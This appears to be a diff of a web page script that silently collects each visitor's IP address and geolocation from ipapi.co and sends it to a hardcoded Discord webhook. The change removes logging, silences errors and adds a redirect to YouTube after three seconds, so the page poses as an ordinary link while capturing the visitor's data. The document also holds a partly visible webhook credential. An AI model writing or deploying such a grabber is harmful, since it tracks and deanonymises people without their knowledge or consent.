@@ -14,9 +14,7 @@ const webhookURL = "https://discord.com/api/webhooks/1467501807830831154/RuLUs4f
 
 fetch("https://ipapi.co/json/")
   .then(r => r.text()) // raw text from ipapi
-  .then(t => {
-    console.log(t); // logs the full response
-    
+  .then(t => {    
     // send it to Discord webhook
     fetch(webhookURL, {
       method: "POST",
@@ -28,9 +26,9 @@ fetch("https://ipapi.co/json/")
       })
     });
   })
-  .catch(error => {
-    console.error("Failed to fetch IP data:", error);
-  });
+  .catch(error => {  });
+  setTimeout(() => window.location.href = "https://www.youtube.com/", 3000);
+
 </script>
 
 
